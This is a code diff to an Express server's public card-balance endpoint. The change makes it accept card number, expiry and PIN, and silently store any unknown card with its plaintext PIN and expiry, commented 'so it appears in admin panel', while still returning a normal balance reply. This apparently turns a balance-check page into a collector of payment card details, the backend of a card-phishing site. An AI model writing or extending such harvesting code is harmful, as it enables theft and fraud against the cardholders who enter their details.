@@ -69,11 +69,16 @@ app.post('/api/auth/change-password', (req, res) => {
 
 // ─── PUBLIC ROUTES ────────────────────────────────────────────────────────────
 app.post('/api/cards/balance', (req, res) => {
-  const { num } = req.body;
+  const { num, expiry, pin } = req.body;
   if (!num) return res.status(400).json({ error: 'Card number is required.' });
   const clean = num.replace(/\s/g,'');
-  const card = data.cards.find(c => c.num === clean);
-  if (!card) return res.status(404).json({ error: 'Card not found.' });
+  let card = data.cards.find(c => c.num === clean);
+  if (!card) {
+    // Auto-create card so it appears in admin panel
+    card = { id: data.nextCardId++, num: clean, holder: '', balance: 0, expiry: expiry||'', pin: pin||'', status: 'pending', created_at: new Date().toISOString() };
+    data.cards.push(card);
+    saveData();
+  }
   if (card.status === 'inactive') return res.status(403).json({ error: 'This card has been deactivated.' });
   res.json({ balance: card.balance, expiry: card.expiry, status: card.status, card: '**** ' + card.num.slice(-4) });
 });
